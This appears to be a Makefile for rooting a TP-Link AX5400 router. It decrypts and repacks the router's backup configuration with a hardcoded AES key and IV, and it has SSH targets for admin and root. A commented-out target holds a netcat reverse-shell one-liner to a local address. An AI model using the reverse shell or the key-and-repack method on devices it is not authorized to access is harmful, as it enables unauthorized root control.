# THIS IS ONLY FOR AX5400

KEY = 2EB38F7EC41D4B8E1422805BCD5F740BC3B95BE163E39D67579EB344427F7836
IV = 360028C9064242F81074F4C127D299F6

unpack:
	openssl aes-256-cbc -d -K $(KEY) -iv $(IV) -in config.bin | pigz -d -z \
		| (dd bs=16 count=1 of=header.bin; cat) > config.tar; tar -xvf config.tar ./ori-backup-user-config.bin;\
 		openssl aes-256-cbc -d -K $(KEY) -iv $(IV) -in ori-backup-user-config.bin \
 		| pigz -d -z > ori-user.xml; rm ori-backup-user-config.bin
pack:
	pigz -c -z ori-user.xml | openssl aes-256-cbc -e -K $(KEY) -iv $(IV) --out ori-backup-user-config.bin;\
 		tar --delete -f config.tar ./ori-backup-user-config.bin;\
 		tar -uf config.tar ./ori-backup-user-config.bin; cat header.bin config.tar\
 		| pigz -c -z | openssl aes-256-cbc -e -K $(KEY) -iv $(IV) --out config-ssh.bin

ssh-admin:
	ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 -v -oHostKeyAlgorithms=+ssh-rsa admin@tplinkwifi.net

ssh-root:
	ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 -v -oHostKeyAlgorithms=+ssh-rsa root@tplinkwifi.net

#temp-root:
	#mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2>&1 | nc 192.168.0.225 12345 > /tmp/f
